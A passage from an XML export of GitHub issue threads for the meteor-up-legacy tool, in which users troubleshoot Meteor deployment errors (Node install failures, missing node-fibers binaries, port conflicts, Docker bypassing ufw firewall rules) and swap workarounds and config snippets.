</Body>
    </Comment>
    <Comment>
      <Owner>rlech</Owner>
      <Body>My first thought was that it should be possible to change the mobile-server ip with a HCP ? So my connected clients get a HCP which is just changing the -mobile-server flag. After the HCP they are connected with the new server. completly new users who download the app from the store get the version with the B Instance.

Maybe the better idea is to setup a Load Balancer in front of everything so the LB decide where to go. So I have no update issues in the future and just have to edit some IPs in the LB config
</Body>
    </Comment>
  </Issue_125>
  <Issue_126>
    <Repository>meteor-up-legacy</Repository>
    <Title>mup setup ERROR: mv: cannot move &#8216;node-v0.10.40-linux-x64&#8217; to &#8216;/opt/nodejs&#8217;: No such file or directory</Title>
    <Owner>arunoda</Owner>
    <Body>I'd be very grateful if someone could help me on this issue:

when I run `mup setup` on a brand new Digital Ocean server (Ubuntu 14.04.4 x64) I get

&gt; ## Meteor Up: Production Quality Meteor Deployments
&gt; 
&gt; &#8220; Checkout Kadira!
&gt;   It's the best way to monitor performance of your app.
&gt;   Visit: https://kadira.io/mup &#8221;
&gt; 
&gt; Started TaskList: Setup (linux)
&gt; [107.170.245.109] - Installing Node.js
&gt; [107.170.245.109] x Installing Node.js: FAILED
&gt; 
&gt;   -----------------------------------STDERR-----------------------------------
&gt;   .......... .......... .......... .......... 91% 4.89M 0s
&gt;     5500K .......... .......... .......... .......... .......... 92% 15.9M 0s
&gt;     5550K .......... .......... .......... .......... .......... 93% 6.57M 0s
&gt;     5600K .......... .......... .......... .......... .......... 94% 49.8M 0s
&gt;     5650K .......... .......... .......... .......... .......... 95% 31.1M 0s
&gt;     5700K .......... .......... .......... .......... .......... 96% 43.7M 0s
&gt;     5750K .......... .......... .......... .......... .......... 96% 11.3M 0s
&gt;     5800K .......... .......... .......... .......... .......... 97% 27.2M 0s
&gt;     5850K .......... .......... .......... .......... .......... 98% 42.4M 0s
&gt;     5900K .......... .......... .......... .......... .......... 99% 8.26M 0s
&gt;     5950K .......... .......... .......... ....                 100% 48.2M=1.0s
&gt; 
&gt;   2016-05-10 06:14:04 (5.65 MB/s) - &#8216;node-v0.10.40-linux-x64.tar.gz.6&#8217; saved [6128131/6128131]
&gt; 
&gt;   mv: cannot move &#8216;node-v0.10.40-linux-x64&#8217; to &#8216;/opt/nodejs&#8217;: No such file or directory
&gt;   -----------------------------------STDOUT-----------------------------------
&gt;   js
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/lib/link.js
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/lib/install.js
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/lib/uninstall.js
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/lib/cache.js
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/lib/star.js
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/lib/search.js
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/lib/docs.js
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/lib/config.js
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/lib/owner.js
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/lib/init.js
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/lib/faq.js
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/lib/dedupe.js
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/LICENSE
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/AUTHORS
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/.npmrc
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/.npmignore
&gt;   node-v0.10.40-linux-x64/lib/node_modules/npm/cli.js
&gt;   node-v0.10.40-linux-x64/LICENSE
&gt; ---

It's the first time I get a 

&gt; mv: cannot move &#8216;node-v0.10.40-linux-x64&#8217; to &#8216;/opt/nodejs&#8217;: No such file or directory

Here is my mup.json:

```
{
  // Server authentication info
  "servers": [
    {
      "host": "107.170.245.109",
      "username": "root",
      // "password": "password"
      // or pem file (ssh based authentication)
      "pem": "~/.ssh/id_rsa"
    }
  ],

  // Install MongoDB in the server, does not destroy local MongoDB on future setup
  "setupMongo": true,

  // WARNING: Node.js is required! Only skip if you already have Node.js installed on server.
  "setupNode": true,

  // WARNING: If nodeVersion omitted will setup 0.10.36 by default. Do not use v, only version number.
  "nodeVersion": "0.10.40",

  // Install PhantomJS in the server
  "setupPhantom": false,

  // Show a progress bar during the upload of the bundle to the server. 
  // Might cause an error in some rare cases if set to true, for instance in Shippable CI
  "enableUploadProgressBar": true,

  // Application name (No spaces)
  "appName": "myApp",

  // Location of app (local directory)
  "app": ".",

  // Configure environment
  "env": {
    "PORT": 3000,

    "ROOT_URL": "http://107.170.245.109"
  },

  // Meteor Up checks if the app comes online just after the deployment
  // before mup checks that, it will wait for no. of seconds configured below
  "deployCheckWaitTime": 15
}
```

I'm using  mup@0.11.3, with meteor version being 1.2.1 (I want to stay to that version, and not upgrade to 1.3.X)

Note that I already succeded in the past with no problem to deploy my app to Digital Ocean using mup (2months ago), but now I can't do it again on a new server...

Any help would save my life, thank you so much.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>First off the dev branch here called mupx uses docker and is much better.
Second is these are both depreciated by the new version at kadirahq/meteor-up.
If your unwilling to move forward with 1.3.2.4+ then maybe mupx is the best choice.
</Body>
    </Comment>
    <Comment>
      <Owner>gflores</Owner>
      <Body>I'm now using Meteor 1.3.2.4, and mupx and it works.
The initial problem still wasn't solved, but at least I can do my deploy again.
</Body>
    </Comment>
    <Comment>
      <Owner>Rahbaran</Owner>
      <Body>I've got exactly the same problem, suddenly not working with version 0.10.40 :( and 1.2.x 
</Body>
    </Comment>
    <Comment>
      <Owner>RenSilvaAU</Owner>
      <Body>I had the same problem. 

I simply created the folder /opt/nodejs directly on the server (I used filezilla, but I guess you could just do "mkdir opt"
"cd opt"
"mkdir nodejs")

then I ran "sudo mup setup" and it worked
</Body>
    </Comment>
    <Comment>
      <Owner>aa21</Owner>
      <Body>Thanks @RenSilvaAU. I don't want to use mupx because I don't want to use Docker, and I hope mup deploy will still be supported in the future.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Unfortunately both versions are pretty much depreciated by kadirahq/meteor-up already.
It's like mupx docker-centric, and the only option other then galaxy moving forward.
</Body>
    </Comment>
  </Issue_126>
  <Issue_127>
    <Repository>meteor-up-legacy</Repository>
    <Title>Uploading bundle: FAILED Received exit code 0 while establishing SFTP session</Title>
    <Owner>arunoda</Owner>
    <Body>Cannot find a fix for this. Any help would be appreciated. I am on a Windows machine.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Can you connect to ftp manually? 
</Body>
    </Comment>
  </Issue_127>
  <Issue_128>
    <Repository>meteor-up-legacy</Repository>
    <Title>Graphicsmagick Not Working</Title>
    <Owner>arunoda</Owner>
    <Body>I've followed all the previous issues and their solutions, but none have worked for me. I constantly keep getting the same error 

![](https://i.gyazo.com/3b87bc42bde0bd58450a974b5b3ca718.png)

To test it I ran: 
docker exec -it &lt;APPNAME&gt;gm
and
docker exec -it &lt;APPNAME&gt;-frontend gm

But these returned errors as well. 

I would appreciate any help.
</Body>
    <State>open</State>
    <Comment>
      <Owner>fdddk23</Owner>
      <Body>Hi,
I'm not sure but:
You need to add graphicsmagick to your docker container. The docker container can't access it when it is "only" installed on the linux system.

Check out http://stackoverflow.com/questions/31901697/meteor-up-docker-and-graphicsmagick/31903981#31903981
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Only the new version at kadirahq/meteor-up is capable of defining your own docker container image.
</Body>
    </Comment>
  </Issue_128>
  <Issue_129>
    <Repository>meteor-up-legacy</Repository>
    <Title>Mupx bypasses ufw firewall rules. Can I config in mup.json?</Title>
    <Owner>arunoda</Owner>
    <Body>When deploying with mupx, it seems to open up the firewall, regardless of how I have ufw setup. The issue is really that I don't want the meteor server reachable on both network interfaces of the machine. Can I configure the firewall or port binding options within the mup.json file? Since I'm already using ufw, I would prefer all of the firewall config to be done there.

Thanks,

Jay
</Body>
    <State>open</State>
    <Comment>
      <Owner>jcheroske</Owner>
      <Body>Just tried adding BIND_IP="private_ip" to the mup.json file, but mupx could not verify the deployment.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I think the new version at kadirahq/meteor-up is already or going to have hooks, which might be a good way to make that happen? 
</Body>
    </Comment>
    <Comment>
      <Owner>jcheroske</Owner>
      <Body>Ok, I fixed this, but for mupx to be truly "production quality" something needs to change. This issue with docker publishing services in such a way that existing iptables rules are bypassed is a known problem that's been plaguing sysadmins for some time now. The easiest fix, from a mupx standpoint, would be for the `/etc/default/docker` file to be automatically edited and the following configuration added:

```
DOCKER_OPTS="--iptables=false"
```

This of course would mean that, if there is a firewall in place, a rule would need to be added to allow traffic to the meteor server's port. With ufw, it's simply something like:

```
ufw allow to &lt;ip_address&gt; port &lt;meteor_port&gt;
```

Because mupx binds the meteor port to all interfaces, and because the "Verifying deployment" step uses the loopback interface to do the verification, a mupx install will succeed without the firewall rule in place (which is a good thing I think). Therefore, all that's needed is to disable docker's iptables editing and to possibly inform the user that they might need to add a firewall rule to allow traffic.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>You should make this optional feature request over at the new version where the development developers reside and monitor such comments kadirahq. I'm sure PRs are welcome as long as its none breaking and optional or at least optional to make a breaking change default at their discretion.
 Thanks for the insights either way.
 Glad to hear you resolved your issue.
</Body>
    </Comment>
  </Issue_129>
  <Issue_130>
    <Repository>meteor-up-legacy</Repository>
    <Title>Can't connect to app deployed on AWS: 'error: Forever detected script exited with code: 8'</Title>
    <Owner>arunoda</Owner>
    <Body>Hi all,

I've followed the whole tutorial [here](http://www.curtismlarson.com/blog/2015/11/03/deploy-meteor-to-aws/), successfully running `mup deploy`. 

**The problem:**

When I try to connect to the server using the EC2 instance's public IP, the firefox and google chrome both time out. Here's what `mup logs` has to say about it:

```
at packages/meteor.js:1358:3
    at /opt/menus/app/programs/server/boot.js:283:10
    at Array.forEach (native)
    at Function._.each._.forEach (/opt/menus/app/programs/server/node_modules/underscore/underscore.js:79:11)
    at /opt/menus/app/programs/server/boot.js:133:5
error: Forever detected script exited with code: 8
 &gt;&gt; stepping down to gid: meteoruser
 &gt;&gt; stepping down to uid: meteoruser
 &gt;&gt; stepping down to gid: meteoruser
 &gt;&gt; stepping down to uid: meteoruser
```

And here's my `mup.json`:

```
{
  // Server authentication info
  "servers": [
    {
      "host": "52.***.***.***",
      "username": "ubuntu",
      "pem": "~/************.pem"
    }
  ],

  // Install MongoDB in the server, does not destroy local MongoDB on future setup
  "setupMongo": true,

  // WARNING: Node.js is required! Only skip if you already have Node.js installed on server.
  "setupNode": true,

  // WARNING: If nodeVersion omitted will setup 0.10.36 by default. Do not use v, only version number.
  "nodeVersion": "0.10.41",

  // Install PhantomJS in the server
  "setupPhantom": true,

  // Show a progress bar during the upload of the bundle to the server.
  // Might cause an error in some rare cases if set to true, for instance in Shippable CI
  "enableUploadProgressBar": true,

  // Application name (No spaces)
  "appName": "menus",

  // Location of app (local directory)
  "app": "~/menus",

  // Configure environment
  "env": {
    "ROOT_URL": "http://myapp.com"
  },

  // Meteor Up checks if the app comes online just after the deployment
  // before mup checks that, it will wait for no. of seconds configured below
  "deployCheckWaitTime": 15
}
```

**What I have tried:**

There seem to be several other issues on this repo with a similar exit code, but the cause of those is usually that Node needs updating. I have checked that the server is running Node v0.10.41. 

A post of stack overflow suggests that /opt/myapp/config/env.sh may be improperly formatted. I opened that file up in vim and noticed there were a lot of escapes that looked out of place. I fiddled with the file but I receive the exact same error as above.

If anyone could help resolve this, I'd be extremely grateful! 

Thanks in advance.
</Body>
    <State>open</State>
    <Comment>
      <Owner>rlech</Owner>
      <Body>1. Server Ports open via Security Rules for your clients?
2. Are you using meteor 1.3? I failed to deploy it with MUP (but different error) but with MUPX it works for me on a AWS EC2
</Body>
    </Comment>
  </Issue_130>
  <Issue_131>
    <Repository>meteor-up-legacy</Repository>
    <Title>NPM Install</Title>
    <Owner>arunoda</Owner>
    <Body>I am getting the following error when running npm install of Meteor bundle:

_npm install_
_npm WARN cannot run in wd meteor-dev-bundle@0.0.0 node npm-rebuild.js (wd=/home/invite/bundle/programs/server)_

Has anyone seen this before or can point me in a direction to get this resolved? Thanks in advance.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Are you using mup? 
https://github.com/arunoda/meteor-up/issues/305
Try mupx or better kadirahq/meteor-up
Update everything meteor 1.3.2.4 etc.
Soon meteor will use nodejs 6 tests with 4 &amp; 5 have worked but are not released.
</Body>
    </Comment>
    <Comment>
      <Owner>mrlarssen</Owner>
      <Body>Did you find a solution for this?
</Body>
    </Comment>
  </Issue_131>
  <Issue_132>
    <Repository>meteor-up-legacy</Repository>
    <Title>Pass in --server-only Flag to MUPX?</Title>
    <Owner>arunoda</Owner>
    <Body>Is it possible to pass in a `--server-only` flag to MUPX like we do with typical `meteor build` command?

I have a project with `ios` and `android` platforms, and I don't need to build them every time I use MUPX to deploy to my linux servers.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>You have to manually remove them from the "platforms" file somehow or use meteor remove-plateform ios android temporarily while you're deploying.
You could write a simple script to remove, deploy and add them back when done I suppose.
I'm not sure if the new version at kadirahq/meteor-up just stomps the platforms file after copying it for you or not either? 
</Body>
    </Comment>
    <Comment>
      <Owner>matejicekme</Owner>
      <Body>Hi there,

Same question here, I need to pass --server-only flag. I'll try to remove-plateform on every build, if someone have a better solution ... :)

Thank you !
</Body>
    </Comment>
    <Comment>
      <Owner>MichaelJCole</Owner>
      <Body>Hey, someone from MDG just told me that 'remove-platform' doesn't work anymore.  Without the platforms, meteor won't push updates to the phone apps.

https://forums.meteor.com/t/mupx-cordova-build/20745/5

What would it take to get that working with mupx?  
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Can one not manually edit the platforms file anymore either? 
</Body>
    </Comment>
    <Comment>
      <Owner>MichaelJCole</Owner>
      <Body>@MasterJames I think the problem is if `ios` is in the platforms file, and you try to build on linux, it will fail without the `--server-only`   You can still manually edit the file, it's about whether or not build makes hot code push files for the platforms.

+1 for the PR @Siphion
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Oh I see thanks. PRs or&#233; not being accepted here any more these versions are depreciated by the new port at kadirahq/meteor-up
If the problem still exists with the newer version maybe bring it up there.
</Body>
    </Comment>
    <Comment>
      <Owner>MichaelJCole</Owner>
      <Body>Hey, I found a work-around for this with mupx.  There is a `buildOptions.executable` option in the mup.json file.

```
{
  "appName": "phone",
  ...
  "env": {
  },
  "buildOptions": {
    "executable": "meteor-server-only"
  }
}
```

Then, somewhere in your path (`~/bin`?) add this file:

``` meteor-server-only
#!/bin/bash
echo ----------------------------------------------------------------------
echo meteor "$@" --server-only
echo ----------------------------------------------------------------------
meteor "$@" --server-only
```

(Don't forget to `chmod +x meteor-server-only`)

Hacky, but works.  The new mup is probably amazing!  Can't wait to check it out.
</Body>
    </Comment>
  </Issue_132>
  <Issue_133>
    <Repository>meteor-up-legacy</Repository>
    <Title>had to remove "android" from platforms before deploying ?</Title>
    <Owner>arunoda</Owner>
    <Body>for some weird reason having "android" on my .meteor/platforms were generating an error before deploying, unfortunately i end up loosing my logs so can't add them here.

trying to deploying from OSX 10 to digital ocean ubuntu x64.
</Body>
    <State>open</State>
    <Comment>
      <Owner>gamedevsam</Owner>
      <Body>+1 for this :+1: 
</Body>
    </Comment>
  </Issue_133>
  <Issue_134>
    <Repository>meteor-up-legacy</Repository>
    <Title>Error deploying from OS X to Ubuntu</Title>
    <Owner>arunoda</Owner>
    <Body>`mupx reconfig` gives me the following error on my mac development machine

``` -----------------------------------STDERR-----------------------------------
    bash: /opt/nova/config/start.sh: No such file or directory
    -----------------------------------STDOUT-----------------------------------
    ----------------------------------------------------------------------------
```

`mupx deploy` returns this

```
Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json

&#8220; Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup &#8221;

Meteor app path    : /Users/user1/Telescope
Using buildOptions : {}
```

the `appName`as specified in the `mup.json`is `nova`and there is no directory such as `/opt/` anywhere on my mac development system.
</Body>
    <State>open</State>
    <Comment>
      <Owner>creativenode</Owner>
      <Body>`/opt/nova/config/start.sh` is on your Ubuntu server not your mac. It's where `mupx` deploys your app too. 

You can `mupx logs --tail=150` to view the last 150 line of log messages on your mac to see if there are any further clues as to what is happening.
</Body>
    </Comment>
    <Comment>
      <Owner>bluerabbbit</Owner>
      <Body>After I type in `mupx logs --tail=150`

```
Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json

[10.29.x.x] Error: No such container: Telescope
```
</Body>
    </Comment>
    <Comment>
      <Owner>bluerabbbit</Owner>
      <Body>Changed the appName to `Telescope`
</Body>
    </Comment>
  </Issue_134>
  <Issue_135>
    <Repository>meteor-up-legacy</Repository>
    <Title>Make mup compatible with Meteor 1.3</Title>
    <Owner>arunoda</Owner>
    <Body>This patch does few things:
- updates Node version to 0.10.43, which is required for Meteor 1.3
- updates `deploy.sh` script to properly re-build binary npm packages on 1.3
- while at it, updates MongoDB to 3.2 and PhantomJS to 2.1.1

I understand that mup is currently not actively maintained, but I think it would be nice to make it compatible with 1.3 at least, as there are still some people that rely on this excellent tool.
</Body>
    <State>open</State>
    <Comment>
      <Owner>exsilium</Owner>
      <Body>Please pull this in, seems to have fixed mup deployment for me when upgrading from Meteor 1.2.1 to 1.3.1. Thanks @M4v3R for the fix!
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>It's not really 100% official but this is depreciated because they are working diligently to port it to kadirahq/meteor-up and no PRs have been merged here in a long time is it over 40 now? ! Anyway if it isn't redundant in the new version they would welcome it there. 
</Body>
    </Comment>
  </Issue_135>
  <Issue_136>
    <Repository>meteor-up-legacy</Repository>
    <Title>How to deploy with hidden dot folder (/.files) or create dot folder on production</Title>
    <Owner>arunoda</Owner>
    <Body>I'm trying to create hidden dot folder on the same level as public to serve static files I generate every day. 

``` javascript
var fs = Npm.require('fs');

Meteor.startup(function() {
  var dir = './../../../../../.files';
  if (!fs.existsSync(dir)){
      fs.mkdirSync(dir);
  }
  routePath = fs.realpathSync(dir);
})
```

Everything works on production but I got error during deploy : Invoking deployment process: FAILED

Logs showed I can't create this folder: 

``` javascript
Error: EACCES, permission denied './../../../../../.files'
    at Object.fs.mkdirSync (fs.js:654:18)
    at Router.map.route.where (server/server_router.js:7:10)
    at /opt/appname/app/programs/server/boot.js:249:5
error: Forever detected script exited with code: 7
error: Script restart attempt #14 
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>Ethaan</Owner>
      <Body>Did you get a solution for this?
</Body>
    </Comment>
  </Issue_136>
  <Issue_137>
    <Repository>meteor-up-legacy</Repository>
    <Title>mupx logs failing with meteor 1.3</Title>
    <Owner>arunoda</Owner>
    <Body>Hello,

since the upgrade to meteor 1.3, mupx logs command is failing:

```
Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json

events.js:154
      throw er; // Unhandled 'error' event
      ^

Error: connect ETIMEDOUT 46.101.222.35:22
    at Object.exports._errnoException (util.js:890:11)
    at exports._exceptionWithHostPort (util.js:913:20)
    at TCPConnectWrap.afterConnect [as oncomplete] (net.js:1061:14)
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>jujes</Owner>
      <Body>I have the same issue ....
:(
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Updating today should get you to 1.3.2.2 an official release, that is finally working better with the intended module npm plan.
Maybe redo your mupx completely with running setup again. 
Also try the official mupx port at kadirahq/meteor-up this version is depreciating and it was only built for meteor 1.2 anyway.
</Body>
    </Comment>
    <Comment>
      <Owner>yuyangchee98</Owner>
      <Body>Hey, I'm having the same issue here, have you found your error?
</Body>
    </Comment>
  </Issue_137>
  <Issue_138>
    <Repository>meteor-up-legacy</Repository>
    <Title>Redeploying with mupx leads to node-fiber missing error</Title>
    <Owner>arunoda</Owner>
    <Body>After I have made changes to my project and redeploy using the `mupx deploy` command it seems that the after the redeployment my app fails to start and i get the followign error:
`Error:`/bundle/bundle/programs/server/node_modules/fibers/bin/linux-x64-v8-3.14/fibers.node`is missing. Try reinstalling`node-fibers`?
`

Any ideas how to fix it?

I am on meteor 1.3-rc releases

Thanks in advance! 

Also, i tried to deloy using node 0.10.x but it didn't help. It was mentioned by @arunoda in this [issue](https://github.com/arunoda/meteor-up/issues/342)
</Body>
    <State>open</State>
    <Comment>
      <Owner>ramzwatcher</Owner>
      <Body>same issue with me
</Body>
    </Comment>
    <Comment>
      <Owner>programthis</Owner>
      <Body>@walleXD @ramzwatcher I got this error after upgrading to Meteor 1.3 but ran mupx setup again before mupx deploy and it seemed to fix the issue.
</Body>
    </Comment>
    <Comment>
      <Owner>walleXD</Owner>
      <Body>@programthis The problem still persists for me, even after running `mupx setup` before redeployment. My errors:

`/bundle/bundle/programs/server/node_modules/fibers/fibers.js:16
Throw new Error('`'+ modPath+ '.node`is missing. Try reinstalling`node-fiber
Error: `/bundle/bundle/programs/server/node_modules/fibers/bin/linux-x64-v8-3.14/fibers.node` is missing. Try reinstalling `node-fibers`?
`

Guys, any idea how to fix this? I pretty much am spinning up new Digital ocean droplets everytime I am making changes to my code and I am not sure how to solve this......

Your help would be much appreciated!
</Body>
    </Comment>
    <Comment>
      <Owner>mattiLeBlanc</Owner>
      <Body>I am having the same issue:

```
2016-04-01T01:24:49.122459700Z /bundle/bundle/programs/server/node_modules/fibers/fibers.js:16
2016-04-01T01:24:49.122799400Z  throw new Error('`'+ modPath+ '.node` is missing. Try reinstalling `node-fibe
```

waitTime is set to 60, to no avail.

Update: when I stopped the service first and then did mupx deploy it DID work.
SO...

```
mupx stop
mupx deploy
...beer...
```

update 2: 
errm... it seemed to be a fluke. Next time we tried we got the same error.
How is this possible?
</Body>
    </Comment>
    <Comment>
      <Owner>d-i-b</Owner>
      <Body>I got the same message. Meteor up is cool but just check the issues, open issues twice closed ones.
Anyway, I managed to get the app running.
ssh into your server first, then reinstall fibers `cd /opt/yourapp/current/bundle/programs/server/node_modules/ ; rm -rf fibers &amp;&amp; npm install fibers`
now quit ssh session and try `mupx start`
The bundle should be built on the target server(why not?).

Other than this issue, for now there are 487 issues open and 46 pull requests including  #942 update node version, #773 add system architecture to build(which may fix this issue and bcrypt ones) and #736 introduce mongo dump and restore with many other updates.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>You are correct! I think it now says this is officially depreciated as the port of mupx over at kadirahq is where all efforts and momentum moving forward are focused. Still it's under development and the development branch here called mupx is suppose to be the "stable" version but with changes to Meteor etc going on its probably wise to try the new kadirahq version as you'll also get better official support and PRs are surely welcome.
</Body>
    </Comment>
    <Comment>
      <Owner>frigginglorious</Owner>
      <Body>I was having the same issue. I fixed it by by ssh-ing into the vagrant-spk box, and 
sudo apt-get install g++.

For some reason the fibers package needed to be built?

Sandstorm doessn't like to load the grain now, but at least its building.
</Body>
    </Comment>
    <Comment>
      <Owner>mori-taka</Owner>
      <Body>I got the same issue to use mup after updating meteor.
I tried to downgrade the version of meteor and node, then I succeeded to deploy to AWS. For the deploying, I had created a new instance Ubuntu 14.04 t1.micro in AWS.

In my project folder, run `meteor update --release 1.3.1`
Edit mup.json in the project like `{ "nodeVersion": "0.10.41", ... }` 
My local environment is Ubuntu 14.04.

I have not tried mupx.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Yes mupx is the newer version and both here are now pretty much depreciated by the port of a similar docker centric approach to mupx now at kadirahq/meteor-up 
Moving forward with meteor 1.3.2.2/4 you'll want to be using that newer version.
</Body>
    </Comment>
    <Comment>
      <Owner>idanwe</Owner>
      <Body>Set `"deployCheckWaitTime"` to `60` fix the problem as mentioned here https://github.com/kadirahq/meteor-up#faq
</Body>
    </Comment>
  </Issue_138>
  <Issue_139>
    <Repository>meteor-up-legacy</Repository>
    <Title>MUPX: Unable to deploy to server</Title>
    <Owner>arunoda</Owner>
    <Body>I just got mupx installed on my Mac and am trying to deploy to server.  I was able to init and setup fine including setting up my `mup.json` and `settings.json` fine but got this when trying to deploy:

```
$ mupx deploy

Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json

Meteor app path    : /Users/acamarata/Sites/sunnah
Using buildOptions : {}

Started TaskList: Deploy app 'sunnah' (linux)
[xx.xx.xx.xx] - Uploading bundle
[xx.xx.xx.xx] - Uploading bundle: SUCCESS
[xx.xx.xx.xx] - Sending environment variables
[xx.xx.xx.xx] - Sending environment variables: SUCCESS
[xx.xx.xx.xx] - Initializing start script
[xx.xx.xx.xx] - Initializing start script: SUCCESS
[xx.xx.xx.xx] - Invoking deployment process
[xx.xx.xx.xx] x Invoking deployment process: FAILED

    -----------------------------------STDERR-----------------------------------
    Failed to remove container (sunnah): Error response from daemon: No such container: sunnah
    Failed to remove container (sunnah-frontend): Error response from daemon: No such container: sunnah-frontend
    docker: Error response from daemon: failed to create endpoint sunnah on network bridge: Error starting userland proxy: listen tcp 0.0.0.0:80: bind: address already in use.
    -----------------------------------STDOUT-----------------------------------
    base: Pulling from meteorhacks/meteord
    4d690fa98655: Already exists
    a3ed95caeb02: Already exists
    0638f01c6191: Pulling fs layer
    086f3bb36259: Pulling fs layer
    0638f01c6191: Verifying Checksum
    0638f01c6191: Download complete
    0638f01c6191: Pull complete
    0638f01c6191: Pull complete
    086f3bb36259: Verifying Checksum
    086f3bb36259: Download complete
    086f3bb36259: Pull complete
    086f3bb36259: Pull complete
    Digest: sha256:684021facd5847f6a4ee2f0095fd26b4d7f5af2b776150531914d43fd0eb889b
    Status: Downloaded newer image for meteorhacks/meteord:base
    f0e7cc011a72127f0542d797a3a1bf3e6c5030d6c4c9753baee59836b3667a6f
    ----------------------------------------------------------------------------
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>chackerian</Owner>
      <Body>I'm not familiar with this error but I had one similar.

Stuff I have done: 
- Create a new instance in whatever hosting your using and use the freshly setup instance
- Make sure your meteor app is running properly
-  Try updating mupx in case you have an old version.

Hope this helps
</Body>
    </Comment>
    <Comment>
      <Owner>acamarata</Owner>
      <Body>I have another meteor app on this server already with Docker that I
wouldn't want to take down.  I do want all my Meteor apps on one server...
is this possible with mupx?

On Sun, Mar 27, 2016 at 5:36 PM, Nathan notifications@github.com wrote:

&gt; I'm not familiar with this error but I had one similar.
&gt; 
&gt; Stuff I have done:
&gt; - Create a new instance in whatever hosting your using and use the
&gt;   freshly setup instance
&gt; - Make sure your meteor app is running properly
&gt; - Try updating mupx in case you have an old version.
&gt; 
&gt; Hope this helps
&gt; 
&gt; &#8212;
&gt; You are receiving this because you authored the thread.
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/meteor-up/issues/928#issuecomment-202032749
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>The newer port at kadirahq might be a better place to explore that. It is possible I think there's been a few threads addressing that here.
Oh you might need to extend your wait to confirm deployment time to 120 just to be sure that's not the issue here.
</Body>
    </Comment>
    <Comment>
      <Owner>Luciahelloworld</Owner>
      <Body>port:80 has been used, kill the process that occupy port 80.
1.`lsof -i:80`
2.`kill &lt;pid&gt;`
3.`mupx start`
Note:the version of node must be 0.10.X. I use 0.10.44.
</Body>
    </Comment>
  </Issue_139>
  <Issue_140>
    <Repository>meteor-up-legacy</Repository>
    <Title>Firewall prevents deploy</Title>
    <Owner>arunoda</Owner>
    <Body>Hi, this is probably more of a question than a bug, but I didn't find any posts about it. I have successfully deployed with mupx, but _had to disable my firewall_ to do so. I ran the deploy multiple times with some very large deployCheckWaitTime values, but it only worked when I disabled ufw.

I can confirm that the following are allowed in and out:
22/tcp
80/tcp
443/tcp

The deploy verification step fails with this error: (I was able to run "npm -g install npm@latest" successfully)
x Verifying deployment: FAILED

```
-----------------------------------STDERR-----------------------------------
 to the latest stable version, run:
npm WARN deprecated 
npm WARN deprecated   npm -g install npm@latest
npm WARN deprecated 
npm WARN deprecated (Depending on how Node.js was installed on your system, you
npm WARN deprecated may need to prefix the preceding commands with `sudo`, or if
npm WARN deprecated on Windows, run them from an Administrator prompt.)
npm WARN deprecated 
npm WARN deprecated If you're running the version of npm bundled with
npm WARN deprecated Node.js 0.10 LTS, be aware that the next version of 0.10 LTS
npm WARN deprecated will be bundled with a version of npm@2, which has some small
npm WARN deprecated backwards-incompatible changes made to `npm run-script` and
npm WARN deprecated semver behavior.
npm WARN package.json meteor-dev-bundle@0.0.0 No description
npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
npm WARN package.json meteor-dev-bundle@0.0.0 No README data
=&gt; Starting meteor app on port:80

=&gt; Redeploying previous version of the app

-----------------------------------STDOUT-----------------------------------

To see more logs type 'mup logs --tail=50'

----------------------------------------------------------------------------
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Posting complete DEBUG level logs and mupx settings would be helpful. Also an idea of what your target  and deployment machines are. Example AWS Ubuntu 14+
</Body>
    </Comment>
    <Comment>
      <Owner>paolo-g</Owner>
      <Body>Hi @MasterJames, thanks for the quick reply and apologies for my late response.

Target: Ubuntu 14+
Deployment: Mac

I'm not sure how to capture the complete debug level logs. Any advice? It definitely has to do with a particular port being blocked during the "Verifying Deployment" stage, because it works when I disable the firewall.
</Body>
    </Comment>
    <Comment>
